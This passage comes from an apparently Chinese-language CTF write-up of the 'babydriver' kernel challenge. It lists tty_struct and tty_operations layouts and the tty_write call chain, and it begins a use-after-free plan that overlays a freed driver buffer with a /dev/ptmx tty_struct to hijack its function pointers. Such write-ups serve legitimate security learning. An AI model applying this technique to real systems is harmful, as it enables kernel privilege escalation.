winsize;</span><br><span class="line"><span class="comment">/*  496:31   |     8 */</span>    <span class="keyword">unsigned</span> <span class="keyword">long</span> stopped : <span class="number">1</span>;</span><br><span class="line"><span class="comment">/*  496:30   |     8 */</span>    <span class="keyword">unsigned</span> <span class="keyword">long</span> flow_stopped : <span class="number">1</span>;</span><br><span class="line"><span class="comment">/* XXX  6-bit hole   */</span></span><br><span class="line"><span class="comment">/* XXX  3-byte hole  */</span></span><br><span class="line"><span class="comment">/*  504: 2   |     8 */</span>    <span class="keyword">unsigned</span> <span class="keyword">long</span> unused : <span class="number">62</span>;</span><br><span class="line"><span class="comment">/* XXX  2-bit hole   */</span></span><br><span class="line"><span class="comment">/*  512      |     4 */</span>    <span class="keyword">int</span> hw_stopped;</span><br><span class="line"><span class="comment">/*  512:24   |     8 */</span>    <span class="keyword">unsigned</span> <span class="keyword">long</span> ctrl_status : <span class="number">8</span>;</span><br><span class="line"><span class="comment">/*  512:23   |     8 */</span>    <span class="keyword">unsigned</span> <span class="keyword">long</span> packet : <span class="number">1</span>;</span><br><span class="line"><span class="comment">/* XXX  7-bit hole   */</span></span><br><span class="line"><span class="comment">/* XXX  2-byte hole  */</span></span><br><span class="line"><span class="comment">/*  520: 9   |     8 */</span>    <span class="keyword">unsigned</span> <span class="keyword">long</span> unused_ctrl : <span class="number">55</span>;</span><br><span class="line"><span class="comment">/* XXX  1-bit hole   */</span></span><br><span class="line"><span class="comment">/* XXX  1-byte hole  */</span></span><br><span class="line"><span class="comment">/*  528      |     4 */</span>    <span class="keyword">unsigned</span> <span class="keyword">int</span> receive_room;</span><br><span class="line"><span class="comment">/*  532      |     4 */</span>    <span class="keyword">int</span> flow_change;</span><br><span class="line"><span class="comment">/*  536      |     8 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line"><span class="comment">/*  544      |     8 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line"><span class="comment">/*  552      |     4 */</span>    <span class="keyword">int</span> alt_speed;</span><br><span class="line"><span class="comment">/* XXX  4-byte hole  */</span></span><br><span class="line"><span class="comment">/*  560      |    24 */</span>    <span class="keyword">wait_queue_head_t</span> write_wait;</span><br><span class="line"><span class="comment">/*  584      |    24 */</span>    <span class="keyword">wait_queue_head_t</span> read_wait;</span><br><span class="line"><span class="comment">/*  608      |    32 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> &#123;</span></span><br><span class="line"><span class="comment">/*  608      |     8 */</span>        <span class="keyword">atomic_long_t</span> data;</span><br><span class="line"><span class="comment">/*  616      |    16 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line"><span class="comment">/*  616      |     8 */</span>            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/*  624      |     8 */</span>            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">prev</span>;</span></span><br><span class="line"></span><br><span class="line">                                   <span class="comment">/* total size (bytes):   16 */</span></span><br><span class="line">                               &#125; entry;</span><br><span class="line"><span class="comment">/*  632      |     8 */</span>        <span class="keyword">work_func_t</span> func;</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):   32 */</span></span><br><span class="line">                           &#125; hangup_work;</span><br><span class="line"><span class="comment">/*  640      |     8 */</span>    <span class="keyword">void</span> *disc_data;</span><br><span class="line"><span class="comment">/*  648      |     8 */</span>    <span class="keyword">void</span> *driver_data;</span><br><span class="line"><span class="comment">/*  656      |    16 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line"><span class="comment">/*  656      |     8 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/*  664      |     8 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">prev</span>;</span></span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):   16 */</span></span><br><span class="line">                           &#125; tty_files;</span><br><span class="line"><span class="comment">/*  672      |     4 */</span>    <span class="keyword">int</span> closing;</span><br><span class="line"><span class="comment">/* XXX  4-byte hole  */</span></span><br><span class="line"><span class="comment">/*  680      |     8 */</span>    <span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;</span><br><span class="line"><span class="comment">/*  688      |     4 */</span>    <span class="keyword">int</span> write_cnt;</span><br><span class="line"><span class="comment">/* XXX  4-byte hole  */</span></span><br><span class="line"><span class="comment">/*  696      |    32 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> &#123;</span></span><br><span class="line"><span class="comment">/*  696      |     8 */</span>        <span class="keyword">atomic_long_t</span> data;</span><br><span class="line"><span class="comment">/*  704      |    16 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line"><span class="comment">/*  704      |     8 */</span>            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/*  712      |     8 */</span>            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">prev</span>;</span></span><br><span class="line"></span><br><span class="line">                                   <span class="comment">/* total size (bytes):   16 */</span></span><br><span class="line">                               &#125; entry;</span><br><span class="line"><span class="comment">/*  720      |     8 */</span>        <span class="keyword">work_func_t</span> func;</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):   32 */</span></span><br><span class="line">                           &#125; SAK_work;</span><br><span class="line"><span class="comment">/*  728      |     8 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line"></span><br><span class="line">                           <span class="comment">/* total size (bytes):  736 */</span></span><br><span class="line">                         &#125;</span><br></pre></td></tr></table></figure>
<p>大小为<code>0x2e0</code>，在偏移为<code>24</code>的地方，有一个结构体<code>tty_operations</code>，存储着大量的函数指针：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* offset    |  size */</span>  type = struct tty_operations &#123;</span><br><span class="line"><span class="comment">/*    0      |     8 */</span>    struct tty_struct *(*lookup)(struct tty_driver *, struct inode *, <span class="keyword">int</span>);</span><br><span class="line"><span class="comment">/*    8      |     8 */</span>    <span class="keyword">int</span> (*install)(struct tty_driver *, struct tty_struct *);</span><br><span class="line"><span class="comment">/*   16      |     8 */</span>    <span class="keyword">void</span> (*remove)(struct tty_driver *, struct tty_struct *);</span><br><span class="line"><span class="comment">/*   24      |     8 */</span>    <span class="keyword">int</span> (*open)(struct tty_struct *, struct file *);</span><br><span class="line"><span class="comment">/*   32      |     8 */</span>    <span class="keyword">void</span> (*close)(struct tty_struct *, struct file *);</span><br><span class="line"><span class="comment">/*   40      |     8 */</span>    <span class="keyword">void</span> (*shutdown)(struct tty_struct *);</span><br><span class="line"><span class="comment">/*   48      |     8 */</span>    <span class="keyword">void</span> (*cleanup)(struct tty_struct *);</span><br><span class="line"><span class="comment">/*   56      |     8 */</span>    <span class="keyword">int</span> (*write)(struct tty_struct *, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *, <span class="keyword">int</span>);</span><br><span class="line"><span class="comment">/*   64      |     8 */</span>    <span class="keyword">int</span> (*put_char)(struct tty_struct *, <span class="keyword">unsigned</span> <span class="keyword">char</span>);</span><br><span class="line"><span class="comment">/*   72      |     8 */</span>    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *);</span><br><span class="line"><span class="comment">/*   80      |     8 */</span>    <span class="keyword">int</span> (*write_room)(struct tty_struct *);</span><br><span class="line"><span class="comment">/*   88      |     8 */</span>    <span class="keyword">int</span> (*chars_in_buffer)(struct tty_struct *);</span><br><span class="line"><span class="comment">/*   96      |     8 */</span>    <span class="keyword">int</span> (*ioctl)(struct tty_struct *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line"><span class="comment">/*  104      |     8 */</span>    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line"><span class="comment">/*  112      |     8 */</span>    <span class="keyword">void</span> (*set_termios)(struct tty_struct *, struct ktermios *);</span><br><span class="line"><span class="comment">/*  120      |     8 */</span>    <span class="keyword">void</span> (*throttle)(struct tty_struct *);</span><br><span class="line"><span class="comment">/*  128      |     8 */</span>    <span class="keyword">void</span> (*unthrottle)(struct tty_struct *);</span><br><span class="line"><span class="comment">/*  136      |     8 */</span>    <span class="keyword">void</span> (*stop)(struct tty_struct *);</span><br><span class="line"><span class="comment">/*  144      |     8 */</span>    <span class="keyword">void</span> (*start)(struct tty_struct *);</span><br><span class="line"><span class="comment">/*  152      |     8 */</span>    <span class="keyword">void</span> (*hangup)(struct tty_struct *);</span><br><span class="line"><span class="comment">/*  160      |     8 */</span>    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *, <span class="keyword">int</span>);</span><br><span class="line"><span class="comment">/*  168      |     8 */</span>    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *);</span><br><span class="line"><span class="comment">/*  176      |     8 */</span>    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *);</span><br><span class="line"><span class="comment">/*  184      |     8 */</span>    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *, <span class="keyword">int</span>);</span><br><span class="line"><span class="comment">/*  192      |     8 */</span>    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *, <span class="keyword">char</span>);</span><br><span class="line"><span class="comment">/*  200      |     8 */</span>    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *);</span><br><span class="line"><span class="comment">/*  208      |     8 */</span>    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line"><span class="comment">/*  216      |     8 */</span>    <span class="keyword">int</span> (*resize)(struct tty_struct *, struct winsize *);</span><br><span class="line"><span class="comment">/*  224      |     8 */</span>    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *, struct termiox *);</span><br><span class="line"><span class="comment">/*  232      |     8 */</span>    <span class="keyword">int</span> (*get_icount)(struct tty_struct *, struct serial_icounter_struct *);</span><br><span class="line"><span class="comment">/*  240      |     8 */</span>    <span class="keyword">int</span> (*poll_init)(struct tty_driver *, <span class="keyword">int</span>, <span class="keyword">char</span> *);</span><br><span class="line"><span class="comment">/*  248      |     8 */</span>    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *, <span class="keyword">int</span>);</span><br><span class="line"><span class="comment">/*  256      |     8 */</span>    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *, <span class="keyword">int</span>, <span class="keyword">char</span>);</span><br><span class="line"><span class="comment">/*  264      |     8 */</span>    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line"></span><br><span class="line">                           <span class="comment">/* total size (bytes):  272 */</span></span><br><span class="line">                         &#125;</span><br></pre></td></tr></table></figure>
<p>而对打开的<code>/dev/pmtx</code>设备进行读写的时候，最后会调用该结构体中的函数指针，以<code>write</code>为例，调用链为：</p>
<ul>
<li>tty_write<ul>
<li>do_tty_write<ul>
<li>n_tty_write<ul>
<li>tty-&gt;ops-&gt;write(tty, b, nr)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>当然，前面会有一系列的校验。</p>
<p>此时的利用思路为：</p>
<ul>
<li>打开两次<code>babydriver</code>，释放<code>1</code>次，释放前将<code>device_buf</code>的大小修改为<code>0x2e0</code></li>
<li>打开<code>/dev/ptmx</code>设备</li>
